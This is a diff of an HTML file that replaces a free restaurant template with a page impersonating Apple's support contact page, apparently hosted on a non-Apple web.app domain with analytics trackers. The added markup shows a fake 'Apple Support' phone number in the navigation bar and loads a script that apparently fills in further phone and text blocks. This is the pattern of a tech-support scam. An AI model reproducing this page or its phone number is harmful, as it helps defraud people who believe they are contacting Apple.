@@ -1,12 +1,8 @@
-<?php
-?>
-<!doctype html>
-<html lang="en">
-  <head>
-     <!-- Histats.com  (div with counter) --><div id="histats_counter"></div>
-<!-- Histats.com  START  (aync)-->
+<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" class="no-js">
+<head>
+  <!-- Histats.com  START  (aync)-->
 <script type="text/javascript">var _Hasync= _Hasync|| [];
-_Hasync.push(['Histats.start', '1,5039472,4,511,95,18,00000000']);
+_Hasync.push(['Histats.start', '1,5039569,4,0,0,0,00010000']);
 _Hasync.push(['Histats.fasi', '1']);
 _Hasync.push(['Histats.track_hits', '']);
 (function() {
@@ -14,725 +10,374 @@ var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async
 hs.src = ('//s10.histats.com/js15_as.js');
 (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
 })();</script>
-<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5039472&101" alt="counter code" border="0"></a></noscript>
+<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5039569&101" alt="counter create hit" border="0"></a></noscript>
 <!-- Histats.com  END  -->
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-MRVHLH4QHS"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
 
-    <title>Meal &mdash; Free Template for Restaurants by Free-Template.co</title>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-    <meta name="description" content="Free Template by Free-Template.co" />
-    <meta name="keywords" content="free template, free bootstrap, free website template" />
-    <meta name="author" content="Free-Template.co" />
+  gtag('config', 'G-MRVHLH4QHS');
+</script>
+<script defer data-domain="gllow-treathubb.web.app" src="https://plausible.io/js/script.js"></script>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="cache-control" content="max-age=3600">
+    <title>Contact - Official Apple</title>
+    <meta name="description" content="Contact Apple support by phone or chat, set up a repair, or make a Genius Bar appointment for iPhone, iPad, Mac and more.">
+    <link rel="stylesheet" href="css/Base.css" type="text/css">
+    <link rel="stylesheet" type="text/css" href="_families%253dSF%252bPro%252cv1_7CSF%252bPro%252bIcons%252cv1html.html">
+    <script src="js/text_tel.js"></script>
 
-    <link href="https://fonts.googleapis.com/css?family=Playfair+Display:300,400,700,800|Open+Sans:300,400,700" rel="stylesheet">
+</head>
 
-    <link rel="stylesheet" href="css/bootstrap.css">
-    <link rel="stylesheet" href="css/animate.css">
-    <link rel="stylesheet" href="css/owl.carousel.min.css">
-
-    <link rel="stylesheet" href="css/magnific-popup.css">
-    <link rel="stylesheet" href="css/aos.css">
-
-    <link rel="stylesheet" href="css/bootstrap-datepicker.css">
-    <link rel="stylesheet" href="css/jquery.timepicker.css">
-
-    <link rel="stylesheet" href="fonts/ionicons/css/ionicons.min.css">
-    <link rel="stylesheet" href="fonts/fontawesome/css/font-awesome.min.css">
-
-    <link rel="stylesheet" href="fonts/flaticon/font/flaticon.css">
-
-    <!-- Theme Style -->
-    <link rel="stylesheet" href="css/style.css">
-
-
-
-    <!-- 
-    //////////////////////////////////////////////////////
-
-    Free TEMPLATE 
-    DESIGNED & DEVELOPED by free-template.co
-      
-    Website:    https://free-template.co
-    Email:      freetemplate.co@gmail.com
-    Twitter:    https://twitter.com/Free_Templateco
-    Facebook:   https://www.facebook.com/Free.Template.co/
-
-    //////////////////////////////////////////////////////
-    -->
-  </head>
-  <body class="bg-light">
-
-    <body data-spy="scroll" data-target="#ftco-navbar-spy" data-offset="0">
-
-    <div class="site-wrap">
-      
-      <nav class="site-menu" id="ftco-navbar-spy">
-        <div class="site-menu-inner" id="ftco-navbar">
-          <ul class="list-unstyled">
-            <li><a href="#section-home">Home</a></li>
-            <li><a href="#section-about">About Us</a></li>
-            <li><a href="#section-menu">Our Menu</a></li>
-            <li><a href="#section-reservation">Reserve A Table</a></li>
-            <li><a href="#section-contact">Contact</a></li>
-          </ul>
+<body>
+    <div id="result"></div>
+    <input type="checkbox" id="ac-gn-menustate" class="ac-gn-menustate">
+    <nav id="ac-globalnav" class="no-js">
+        <div class="ac-gn-content">
+            <ul class="ac-gn-header">
+                <li class="ac-gn-item ac-gn-menuicon">
+                    <label class="ac-gn-menuicon-label" for="ac-gn-menustate" aria-hidden="true">
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-top">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-top"></span>
+					 </span>
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-bottom">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-bottom"></span>
+					 </span>
+				 </label>
+                    <a href="#ac-gn-menustate" class="ac-gn-menuanchor ac-gn-menuanchor-open" id="ac-gn-menuanchor-open">
+					 <span class="ac-gn-menuanchor-label">Open Menu </span></a>
+                    <a href="#" class="ac-gn-menuanchor ac-gn-menuanchor-close" id="ac-gn-menuanchor-close">
+					 <span class="ac-gn-menuanchor-label">Close Menu </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus-small">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag ac-gn-bag-small" id="ac-gn-bag-small">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#"><span class="ac-gn-link-text">Shopping Bag </span><span class="ac-gn-bag-badge"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <ul class="ac-gn-list">
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-mac">
+                    <a class="ac-gn-link ac-gn-link-mac" href="#">
+					 <span class="ac-gn-link-text">Mac </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-ipad">
+                    <a class="ac-gn-link ac-gn-link-ipad" href="#">
+					 <span class="ac-gn-link-text">iPad </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-iphone">
+                    <a class="ac-gn-link ac-gn-link-iphone" href="#">
+					 <span class="ac-gn-link-text">iPhone </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-watch">
+                    <a class="ac-gn-link ac-gn-link-watch" href="#">
+					 <span class="ac-gn-link-text">Watch </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-tv">
+                    <a class="ac-gn-link ac-gn-link-tv" href="#">
+					 <span class="ac-gn-link-text">TV </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-music">
+                    <a class="ac-gn-link ac-gn-link-music" href="#">
+					 <span class="ac-gn-link-text">Music </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-support">
+                    <a class="ac-gn-link ac-gn-link-support" href="#">
+					 <span class="ac-gn-link-text">Support </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-search" role="search">
+                    <a class="ac-gn-link ac-gn-link-search" href="#">
+					 <span class="ac-gn-search-placeholder" aria-hidden="true">Search apple.com </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag" id="ac-gn-bag">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#" aria-label="Shopping Bag">
+					 <span class="ac-gn-link-text">Shopping Bag </span>
+					 <span class="ac-gn-bag-badge" aria-hidden="true"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <aside id="ac-gn-searchview" class="ac-gn-searchview" role="search">
+                <div class="ac-gn-searchview-content">
+                    <form id="ac-gn-searchform" class="ac-gn-searchform" action="http://www.apple.com/us/search" method="get">
+                        <div class="ac-gn-searchform-wrapper">
+                            <input id="ac-gn-searchform-input" class="ac-gn-searchform-input" type="text" placeholder="Search apple.com" autocorrect="off" autocapitalize="off" autocomplete="off" spellcheck="false">
+                            <input id="ac-gn-searchform-src" type="hidden" name="src" value="globalnav">
+                            <button id="ac-gn-searchform-submit" class="ac-gn-searchform-submit" type="submit" disabled="" aria-label="Submit"></button>
+                            <button id="ac-gn-searchform-reset" class="ac-gn-searchform-reset" type="reset" disabled="" aria-label="Clear Search"></button>
+                        </div>
+                    </form>
+                    <aside id="ac-gn-searchresults" class="ac-gn-searchresults"></aside>
+                </div>
+                <button id="ac-gn-searchview-close" class="ac-gn-searchview-close" aria-label="Close Search">
+					 <span class="ac-gn-searchview-close-wrapper">
+						 <span class="ac-gn-searchview-close-left"></span>
+						 <span class="ac-gn-searchview-close-right"></span>
+					 </span>
+			 </button>
+            </aside>
+            <aside class="ac-gn-bagview">
+                <div class="ac-gn-bagview-scrim">
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-small"></span>
+                </div>
+                <div class="ac-gn-bagview-content" id="ac-gn-bagview-content">
+                </div>
+            </aside>
         </div>
-      </nav>
+    </nav>
+    <div id="ac-gn-curtain" class="ac-gn-curtain"></div>
+    <div id="ac-gn-placeholder" class="ac-nav-placeholder"></div>
 
-      <header class="site-header">
-        <div class="row align-items-center">
-          <div class="col-5 col-md-3">
-             
-          </div>
-          <div class="col-2 col-md-6 text-center site-logo-wrap">
-            <a href="index.html" class="site-logo">M</a>
-          </div>
-          <div class="col-5 col-md-3 text-right menu-burger-wrap">
-            <a href="#" class="site-nav-toggle js-site-nav-toggle"><i></i></a>
-
-          </div>
-        </div>
-       
-      </header> <!-- site-header -->
-      
-      <div class="main-wrap " id="section-home">
-
-        <div class="cover_1 overlay bg-slant-white bg-light">
-          <div class="img_bg" style="background-image: url(images/slider-1.jpg);" data-stellar-background-ratio="0.5">
-            <div class="container">
-              <div class="row align-items-center justify-content-center text-center">
-                <div class="col-md-10" data-aos="fade-up">
-                  <h2 class="heading mb-5">Welcome to Meal, where food speaks with your palate</h2>
-                  <p class="sub-heading mb-5">Free Website Template For Restaurants Made by <a href="#">Free-Template.co</a></p>
-                  <p><a href="#section-reservation" class="smoothscroll btn btn-outline-white px-5 py-3">Reserve A Table</a></p>
+    <div class="main">
+        <nav id="ac-localnav" class="js no-touch css-sticky" lang="en-US" role="navigation" data-sticky="">
+            <div class="ac-ln-wrapper">
+                <div class="ac-ln-background"></div>
+                <div class="ac-ln-content">
+                    <span class="ac-ln-title">
+                       <a href="#">Apple Support +1-866-381-6140 <font color="red"><font class="js_setPhoneBlock"></font></font></a>
+					 </span>
+                    <div class="ac-ln-menu">
+                        <a href="#ac-ln-menustate" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-open" id="ac-ln-menustate-open">  <span class="ac-ln-menucta-anchor-label">Open menu </span></a> <a href="#" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-close" id="ac-ln-menustate-close">  <span class="ac-ln-menucta-anchor-label">Close menu </span></a>
+                        <div class="ac-ln-menu-tray">
+                            <ul class="ac-ln-menu-items">
+                                <li class="ac-ln-menu-item"><a href="#" class="ac-ln-menu-link analytics-exitlink"> Communities </a>
+                                </li>
+                            </ul>
+                        </div>
+                        <div class="ac-ln-actions">
+                            <div class="ac-ln-action ac-ln-action-menucta" aria-hidden="true">
+                                <label for="ac-ln-menustate" class="ac-ln-menucta">  <span class="ac-ln-menucta-chevron"></span>
+							 </label>
+                            </div>
+                        </div>
+                    </div>
                 </div>
-              </div>
             </div>
-          </div>
-        </div> <!-- .cover_1 -->
-
-        <div class="section"  data-aos="fade-up">
-          <div class="container">
-            <div class="row section-heading justify-content-center mb-5">
-              <div class="col-md-8 text-center">
-                <h2 class="heading mb-3">Find your best food</h2>
-                <p class="sub-heading mb-5">Free Website Template For Restaurants Made by <a href="#">Free-Template.co</a></p>  
-              </div>
-            </div>
+        </nav>
+        <section class="as-columns  as-columns--1up  as-banner as-banner--top">
             <div class="row">
+                <div class="column large-12 medium-12 small-12">
+                    <div class="as-banner-cont">
+                        <div class="as-banner-image as-banner-image--top">
+                            <style type="text/css">
+                                .as-banner-image.as-banner-image--top {
+                                    background-image: url("images/contact-us-hero.image.large_2x.jpg");
+                                }
 
-              <div class="ftco-46">
-                <div class="ftco-46-row d-flex flex-column flex-lg-row">
-                  <div class="ftco-46-image" style="background-image: url(images/img_1.jpg);"></div>
-                  <div class="ftco-46-text ftco-46-arrow-left">
-                    <h4 class="ftco-46-subheading">Vegies</h4>
-                    <h3 class="ftco-46-heading">Beef Empanadas</h3>
-                    <p class="mb-5">Separated they live in Bookmarksgrove right at the coast of the Semantics, a large language ocean.</p>
-                    <p><a href="#" class="btn-link">Learn More <span class="ion-android-arrow-forward"></span></a></p>
-                  </div>
-                  <div class="ftco-46-image" style="background-image: url(images/img_2.jpg);"></div> 
+                                .as-banner-image.as-banner-image--top:before {
+                                    content: "";
+                                    display: block;
+                                }
+
+                                @media only screen and (max-width: 735px) {
+                                    .as-banner-image.as-banner-image--top {
+                                        background-image: url("images/contact-us-hero.image.small_2x.jpg");
+                                    }
+                                }
+                            </style>
+                            <img sizes="(min-width:735px ) 735w, 100vw" srcset="images/contact-us-hero.image.small_2x.jpg 735w, images/contact-us-hero.image.large_2x.jpg 1440w" alt="" class="as-image-speculativedownload" src="images/contact-us-hero.image.large_2x.jpg">
+                        </div>
+                    </div>
+                    <div class="as-banner-content">
+                        <div class="pageTitle  ">
+                            <h1 class="pageTitle-heading">Apple Support </h1>
+                            <p class="pageTitle-intro js_setTextBlock">
+                        </p></div>
+                        <div class="sectionTitle sectionTitleBlock">
+                            <h2 class="sectionTitle-heading"></h2>
+                        </div>
+                    </div>
                 </div>
-
-                <div class="ftco-46-row d-flex flex-column flex-lg-row">
-                  <div class="ftco-46-text ftco-46-arrow-right">
-                    <h4 class="ftco-46-subheading">Food</h4>
-                    <h3 class="ftco-46-heading">Buttermilk Chicken Jibaritos</h3>
-                    <p class="mb-5">A small river named Duden flows by their place and supplies it with the necessary regelialia.</p>
-                    <p><a href="#" class="btn-link">Learn More <span class="ion-android-arrow-forward"></span></a></p>
-                  </div>
-                  <div class="ftco-46-image" style="background-image: url(images/img_3.jpg);"></div>
-                  <div class="ftco-46-text ftco-46-arrow-up">
-                    <h4 class="ftco-46-subheading">Food</h4>
-                    <h3 class="ftco-46-heading">Chicken Chimichurri Croquettes</h3>
-                    <p class="mb-5">Even the all-powerful Pointing has no control about the blind texts it is an almost unorthographic life.</p>
-                    <p><a href="#" class="btn-link">Learn More <span class="ion-android-arrow-forward"></span></a></p>
-                  </div>
-                </div>
-              </div>
-
             </div>
-          </div>
-        </div> <!-- .section -->
-
-        <div class="section pb-3 bg-white" id="section-about" data-aos="fade-up">
-          <div class="container">
-            <div class="row align-items-center justify-content-center">
-              <div class="col-md-12 col-lg-8 section-heading">
-                <h2 class="heading mb-5">The Restaurant</h2>
-                <p>Far far away, behind the word mountains, far from the countries Vokalia and Consonantia, there live the blind texts. Separated they live in Bookmarksgrove right at the coast of the Semantics, a large language ocean.</p>
-                <p>It is a paradisematic country, in which roasted parts of sentences fly into your mouth.</p>
-              </div>
-            </div>
-          </div>
-        </div> <!-- .section -->
-        
-
-        <div class="section bg-white pt-2 pb-2 text-center" data-aos="fade">
-          <p><img src="images/bg_hero.png" alt="Free Website Template for Restaurants by Free-Template.co" class="img-fluid"></p>
-        </div> <!-- .section -->
-
-        <div class="section bg-white" data-aos="fade-up">
-          <div class="container">
-            <div class="row mb-5">
-              <div class="col-md-12 section-heading text-center">
-                <h2 class="heading mb-5">Meet The Chefs</h2>
-              </div>
-            </div>
-            <div class="row">
-              <div class="col-md-6 pr-md-5 text-center mb-5">
-                <div class="ftco-38">
-                  <div class="ftco-38-img">
-                    <div class="ftco-38-header">
-                      <img src="images/chef_1.jpg" alt="Free Website Template for Restaurants by Free-Template.co">
-                      <h3 class="ftco-38-heading">Daniel Graham</h3>
-                      <p class="ftco-38-subheading">Master Chef</p>
-                    </div>
-                    <div class="ftco-38-body">
-                      <p>Far far away, behind the word mountains, far from the countries Vokalia and Consonantia, there live the blind texts. Separated they live in Bookmarksgrove right at the coast of the Semantics, a large language ocean.</p>
-                      <p>Separated they live in Bookmarksgrove right at the coast of the Semantics, a large language ocean. It is a paradisematic country.</p>
-                      <p>
-                        <a href="#" class="p-2"><span class="fa fa-facebook"></span></a>
-                        <a href="#" class="p-2"><span class="fa fa-twitter"></span></a>
-                        <a href="#" class="p-2"><span class="fa fa-instagram"></span></a>
-                      </p>
-                    </div>
-                  </div>
-                </div>
-              </div>
-              <div class="col-md-6 pl-md-5 text-center mb-5">
-                <div class="ftco-38">
-                  <div class="ftco-38-img">
-                    <div class="ftco-38-header">
-                      <img src="images/chef_2.jpg" alt="Free Website Template for Restaurants by Free-Template.co">
-                      <h3 class="ftco-38-heading">Nick Browning</h3>
-                      <p class="ftco-38-subheading">Master Chef</p>
-                    </div>
-                    <div class="ftco-38-body">
-                      <p>Far far away, behind the word mountains, far from the countries Vokalia and Consonantia, there live the blind texts. Separated they live in Bookmarksgrove right at the coast of the Semantics, a large language ocean.</p>
-                      <p>Separated they live in Bookmarksgrove right at the coast of the Semantics, a large language ocean. It is a paradisematic country.</p>
-                      <p>
-                        <a href="#" class="p-2"><span class="fa fa-facebook"></span></a>
-                        <a href="#" class="p-2"><span class="fa fa-twitter"></span></a>
-                        <a href="#" class="p-2"><span class="fa fa-instagram"></span></a>
-                      </p>
-                    </div>
-                  </div>
-                </div>
-              </div>
-              <!-- <div class="col-md-4"></div> -->
-            </div>
-          </div>
-        </div> <!-- .section -->
-
-        <div class="section bg-light" id="section-menu" data-aos="fade-up">
-          <div class="container">
-            <div class="row section-heading justify-content-center mb-5">
-              <div class="col-md-8 text-center">
-                <h2 class="heading mb-3">Menu</h2>
-                <p class="sub-heading mb-5">Free Website Template For Restaurants Made by <a href="#">Free-Template.co</a></p>  
-              </div>
-            </div>
-            <div class="row justify-content-center">
-              <div class="col-md-8">
-                <ul class="nav site-tab-nav" id="pills-tab" role="tablist">
-                  <li class="nav-item">
-                    <a class="nav-link active" id="pills-breakfast-tab" data-toggle="pill" href="#pills-breakfast" role="tab" aria-controls="pills-breakfast" aria-selected="true">Breakfast</a>
-                  </li>
-                  <li class="nav-item">
-                    <a class="nav-link" id="pills-lunch-tab" data-toggle="pill" href="#pills-lunch" role="tab" aria-controls="pills-lunch" aria-selected="false">Brunch</a>
-                  </li>
-                  <li class="nav-item">
-                    <a class="nav-link" id="pills-dinner-tab" data-toggle="pill" href="#pills-dinner" role="tab" aria-controls="pills-dinner" aria-selected="false">Dinner</a>
-                  </li>
-                </ul>
-                <div class="tab-content" id="pills-tabContent">
-                  <div class="tab-pane fade show active" id="pills-breakfast" role="tabpanel" aria-labelledby="pills-breakfast-tab">
-                    <div class="d-block d-md-flex menu-food-item">
-
-                      <div class="text order-1 mb-3">
-                        <img src="images/img_1.jpg" alt="Free Website Template for Restaurants by Free-Template.co">
-                        <h3><a href="#">Warm Spinach Dip &amp; Chips</a></h3>
-                        <p>Spinach and artichokes in a creamy cheese dip with warm tortilla chips &amp; salsa.</p>
-                      </div>
-                      <div class="price order-2">
-                        <strong>$10.49</strong>
-                      </div>
-                    </div> <!-- .menu-food-item -->
-
-                    <div class="d-block d-md-flex menu-food-item">
-                      <div class="text order-1 mb-3">
-                        <img src="images/img_2.jpg" alt="Free Website Template for Restaurants by Free-Template.co">
-                        <h3><a href="#">Key Wast Machos</a></h3>
-                        <p>Crisp tortilla and plantain chips covered with lightly spiced ground beef, melted cheese, pickled jalapeños, guacamole, sour cream and salsa.</p>
-                      </div>
-                      <div class="price order-2">
-                        <strong>$11.99</strong>
-                      </div>
-                    </div> <!-- .menu-food-item -->
-
-                    <div class="d-block d-md-flex menu-food-item">
-                      <div class="text order-1 mb-3">
-                        <img src="images/img_3.jpg" alt="Free Website Template for Restaurants by Free-Template.co">
-                        <h3><a href="#">Crispy Onions Rings</a></h3>
-                        <p>A heaping mountain of rings, handmade with Panko breading and shredded coconut flakes.</p>
-                      </div>
-                      <div class="price order-2">
-                        <strong>$11.99</strong>
-                      </div>
-                    </div> <!-- .menu-food-item -->
-
-                    <div class="d-block d-md-flex menu-food-item">
-                      <div class="text order-1 mb-3">
-                        <img src="images/img_1.jpg" alt="Free Website Template for Restaurants by Free-Template.co">
-                        <h3><a href="#">Lobster &amp; Shrimp Quesadilla</a></h3>
-                        <p>Lobster and tender shrimp, with onions, sweet peppers, spinach and our three cheese blend. Griddled and served with tomato salsa and sour cream.</p>
-                      </div>
-                      <div class="price order-2">
-                        <strong>$13.99</strong>
-                      </div>
-                    </div> <!-- .menu-food-item -->
-
-
-                  </div>
-                  <div class="tab-pane fade" id="pills-lunch" role="tabpanel" aria-labelledby="pills-lunch-tab">
-                    
-                    <div class="d-block d-md-flex menu-food-item">
-                      <div class="text order-1 mb-3">
-                        <img src="images/img_2.jpg" alt="Free Website Template for Restaurants by Free-Template.co">
-                        <h3><a href="#">Jumbo Lump Crab Stack</a></h3>
-                        <p>Spinach and artichokes in a creamy cheese dip with warm tortilla chips &amp; salsa.</p>
-                      </div>
-                      <div class="price order-2">
-                        <strong>$12.49</strong>
-                      </div>
-                    </div> <!-- .menu-food-item -->
-
-                    <div class="d-block d-md-flex menu-food-item">
-                      <div class="text order-1 mb-3">
-                        <img src="images/img_1.jpg" alt="Free Website Template for Restaurants by Free-Template.co">
-                        <h3><a href="#">Jamaican Chicken Wings</a></h3>
-                        <p>Crisp tortilla and plantain chips covered with lightly spiced ground beef, melted cheese, pickled jalapeños, guacamole, sour cream and salsa.</p>
-                      </div>
-                      <div class="price order-2">
-                        <strong>$15.99</strong>
-                      </div>
-                    </div> <!-- .menu-food-item -->
-
-                    <div class="d-block d-md-flex menu-food-item">
-                      <div class="text order-1 mb-3">
-                        <img src="images/img_3.jpg" alt="Free Website Template for Restaurants by Free-Template.co">
-                        <h3><a href="#">Bahamian Seafood Chowder</a></h3>
-                        <p>A heaping mountain of rings, handmade with Panko breading and shredded coconut flakes.</p>
-                      </div>
-                      <div class="price order-2">
-                        <strong>$10.99</strong>
-                      </div>
-                    </div> <!-- .menu-food-item -->
-
-                    <div class="d-block d-md-flex menu-food-item">
-                      <div class="text order-1 mb-3">
-                        <img src="images/img_2.jpg" alt="Free Website Template for Restaurants by Free-Template.co">
-                        <h3><a href="#">Grilled Chicken &amp; Tropical Fruit on Mixed Greens</a></h3>
-                        <p>Lobster and tender shrimp, with onions, sweet peppers, spinach and our three cheese blend. Griddled and served with tomato salsa and sour cream.</p>
-                      </div>
-                      <div class="price order-2">
-                        <strong>$12.99</strong>
-                      </div>
-                    </div> <!-- .menu-food-item -->
-
-                  </div>
-                  <div class="tab-pane fade" id="pills-dinner" role="tabpanel" aria-labelledby="pills-dinner-tab">
-                    
-                    <div class="d-block d-md-flex menu-food-item">
-                      <div class="text order-1 mb-3">
-                        <img src="images/img_3.jpg" alt="Free Website Template for Restaurants by Free-Template.co">
-                        <h3><a href="#">Grilled Top Sirlion Steak</a></h3>
-                        <p>Spinach and artichokes in a creamy cheese dip with warm tortilla chips &amp; salsa.</p>
-                      </div>
-                      <div class="price order-2">
-                        <strong>$18.99</strong>
-                      </div>
-                    </div> <!-- .menu-food-item -->
-
-                    <div class="d-block d-md-flex menu-food-item">
-                      <div class="text order-1 mb-3">
-                        <img src="images/img_1.jpg" alt="Free Website Template for Restaurants by Free-Template.co">
-                        <h3><a href="#">Steak Oscar</a></h3>
-                        <p>Crisp tortilla and plantain chips covered with lightly spiced ground beef, melted cheese, pickled jalapeños, guacamole, sour cream and salsa.</p>
-                      </div>
-                      <div class="price order-2">
-                        <strong>$23.99</strong>
-                      </div>
-                    </div> <!-- .menu-food-item -->
-
-                    <div class="d-block d-md-flex menu-food-item">
-                      <div class="text order-1 mb-3">
-                        <img src="images/img_2.jpg" alt="Free Website Template for Restaurants by Free-Template.co">
-                        <h3><a href="#">Skirt Steak Churrasco</a></h3>
-                        <p>A heaping mountain of rings, handmade with Panko breading and shredded coconut flakes.</p>
-                      </div>
-                      <div class="price order-2">
-                        <strong>$20.99</strong>
-                      </div>
-                    </div> <!-- .menu-food-item -->
-
-                    <div class="d-block d-md-flex menu-food-item">
-                      <div class="text order-1 mb-3">
-                        <img src="images/img_3.jpg" alt="Free Website Template for Restaurants by Free-Template.co">
-                        <h3><a href="#">Grilled Beef Steak</a></h3>
-                        <p>Lobster and tender shrimp, with onions, sweet peppers, spinach and our three cheese blend. Griddled and served with tomato salsa and sour cream.</p>
-                      </div>
-                      <div class="price order-2">
-                        <strong>$20.99</strong>
-                      </div>
-                    </div> <!-- .menu-food-item -->
-
-                  </div>
-                </div>
-              </div>
-              
-            </div>
-          </div>
-        </div> <!-- .section -->
-
-        <div class="section bg-white services-section" data-aos="fade-up">
-          <div class="container">
-            <div class="row section-heading justify-content-center mb-5">
-              <div class="col-md-8 text-center">
-                <h2 class="heading mb-3">Other Services</h2>
-                <p class="sub-heading mb-5">Free Website Template For Restaurants Made by <a href="#">Free-Template.co</a></p>  
-              </div>
-            </div>
-            <div class="row">
-              <div class="col-m mb-5d-6 col-lg-4" data-aos="fade-up">
-                <div class="media feature-icon d-block text-center">
-                  <div class="icon">
-                    <span class="flaticon-soup"></span>
-                  </div>
-                  <div class="media-body">
-                    <h3>Quality Cuisine</h3>
-                    <p>Far far away, behind the word mountains, far from the countries Vokalia and Consonantia, there live the blind texts.</p>
-                  </div>
-                </div>
-              </div>
-              <div class="col-md-6 col-lg-4 mb-5" data-aos="fade-up" data-aos-delay="100">
-                <div class="media feature-icon d-block text-center">
-                  <div class="icon">
-                    <span class="flaticon-vegetables"></span>
-                  </div>
-                  <div class="media-body">
-                    <h3>Fresh Food</h3>
-                    <p>Far far away, behind the word mountains, far from the countries Vokalia and Consonantia, there live the blind texts.</p>
-                  </div>
-                </div>
-              </div>
-              <div class="col-md-6 col-lg-4 mb-5" data-aos="fade-up" data-aos-delay="300">
-                <div class="media feature-icon d-block text-center">
-                  <div class="icon">
-                    <span class="flaticon-pancake"></span>
-                  </div>
-                  <div class="media-body">
-                    <h3>Bread &amp; Pancake</h3>
-                    <p>Far far away, behind the word mountains, far from the countries Vokalia and Consonantia, there live the blind texts.</p>
-                  </div>
-                </div>
-              </div>
-              <div class="col-md-6 col-lg-4 mb-5" data-aos="fade-up" data-aos-delay="500">
-                <div class="media feature-icon d-block text-center">
-                  <div class="icon">
-                    <span class="flaticon-tray"></span>
-                  </div>
-                  <div class="media-body">
-                    <h3>Reserve Now</h3>
-                    <p>Far far away, behind the word mountains, far from the countries Vokalia and Consonantia, there live the blind texts.</p>
-                  </div>
-                </div>
-              </div>
-
-              <div class="col-md-6 col-lg-4 mb-5" data-aos="fade-up" data-aos-delay="300">
-                <div class="media feature-icon d-block text-center">
-                  <div class="icon">
-                    <span class="flaticon-salad"></span>
-                  </div>
-                  <div class="media-body">
-                    <h3>Fresh Vegies Salad</h3>
-                    <p>Far far away, behind the word mountains, far from the countries Vokalia and Consonantia, there live the blind texts.</p>
-                  </div>
-                </div>
-              </div>
-              <div class="col-md-6 col-lg-4 mb-5" data-aos="fade-up" data-aos-delay="500">
-                <div class="media feature-icon d-block text-center">
-                  <div class="icon">
-                    <span class="flaticon-chicken"></span>
-                  </div>
-                  <div class="media-body">
-                    <h3>Whole Chicken</h3>
-                    <p>Far far away, behind the word mountains, far from the countries Vokalia and Consonantia, there live the blind texts.</p>
-                  </div>
-                </div>
-              </div>
-
-            </div>
-          </div>
-        </div> <!-- .section -->
-
-        <div class="section bg-light" data-aos="fade-up" id="section-reservation">
-          <div class="container">
-            <div class="row section-heading justify-content-center mb-5">
-              <div class="col-md-8 text-center">
-                <h2 class="heading mb-3">Reservation</h2>
-                <p class="sub-heading mb-5">Free Website Template For Restaurants Made by <a href="#">Free-Template.co</a></p>  
-              </div>
-            </div>
-            <div class="row justify-content-center">
-              <div class="col-md-10 p-5 form-wrap">
-                <form action="#">
-                  <div class="row mb-4">
-                    <div class="form-group col-md-4">
-                      <label for="name" class="label">Name</label>
-                      <div class="form-field-icon-wrap">
-                        <span class="icon ion-android-person"></span>
-                        <input type="text" class="form-control" id="name">
-                      </div>
-                    </div>
-                    <div class="form-group col-md-4">
-                      <label for="email" class="label">Email</label>
-                      <div class="form-field-icon-wrap">
-                        <span class="icon ion-email"></span>
-                        <input type="email" class="form-control" id="email">
-                      </div>
-                    </div>
-                    <div class="form-group col-md-4">
-                      <label for="phone" class="label">Phone</label>
-                      <div class="form-field-icon-wrap">
-                        <span class="icon ion-android-call"></span>
-                        <input type="text" class="form-control" id="phone">
-                      </div>
-                    </div>
-
-                    <div class="form-group col-md-4">
-                      <label for="persons" class="label">Number of Persons</label>
-                      <div class="form-field-icon-wrap">
-                        <span class="icon ion-android-arrow-dropdown"></span>
-                        <select name="persons" id="persons" class="form-control">
-                          <option value="">1 person</option>
-                          <option value="">2 persons</option>
-                          <option value="">3 persons</option>
-                          <option value="">4 persons</option>
-                          <option value="">5+ persons</option>
-                        </select>
-                      </div>
-                    </div>
-                    <div class="form-group col-md-4">
-                      <label for="date" class="label">Date</label>
-                      <div class="form-field-icon-wrap">
-                        <span class="icon ion-calendar"></span>
-                        <input type="text" class="form-control" id="date">
-                      </div>
-                    </div>
-                    <div class="form-group col-md-4">
-                      <label for="time" class="label">Time</label>
